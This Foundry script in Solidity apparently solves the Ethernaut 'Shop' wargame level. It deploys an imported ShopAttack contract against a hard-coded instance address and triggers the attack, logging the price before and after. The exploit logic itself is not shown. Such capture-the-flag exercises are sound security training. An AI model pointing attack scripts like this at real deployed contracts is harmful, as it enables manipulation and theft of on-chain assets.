// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/ShopAttack.sol"; // 1) add file

contract SolveShop is Script { // 2) change contractName

    function run() external {

        address target = 0x392EeBBceee79818b709bE623a77b0EA7a1040f5; // 3) add ethernaut instance address
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        ShopAttack attacker = new ShopAttack(target);

        console.log("Price avant attaque: ", IShop(target).price());

        attacker.attack();

        console.log("Price apres attaque: ", IShop(target).price());

        vm.stopBroadcast();

    }
}